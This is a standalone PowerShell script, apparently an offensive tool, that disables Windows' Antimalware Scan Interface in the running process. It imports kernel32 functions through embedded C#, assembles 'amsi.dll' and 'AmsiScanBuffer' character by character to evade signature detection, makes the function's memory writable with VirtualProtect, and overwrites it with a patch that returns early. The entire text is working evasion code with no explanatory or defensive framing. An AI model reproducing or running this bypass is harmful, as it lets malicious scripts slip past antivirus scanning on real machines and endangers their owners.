$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$a = "a" + "m" + "s" + "i" + "." + "d" + "l" + "l"
$b = "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r"
$Address = [Win32]::GetProcAddress([Win32]::LoadLibrary($a), $b)
$p = 0
[Win32]::VirtualProtect($Address, [UInt32]5, 0x40, [Ref]$p)
$Patch = New-Object Byte[] 7
$Patch[0] = 0x66; $Patch[1] = 0xb8; $Patch[2] = 0x01; $Patch[3] = 0x00; $Patch[4] = 0xc2; $Patch[5] = 0x18; $Patch[6] = 0x00;
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 7)
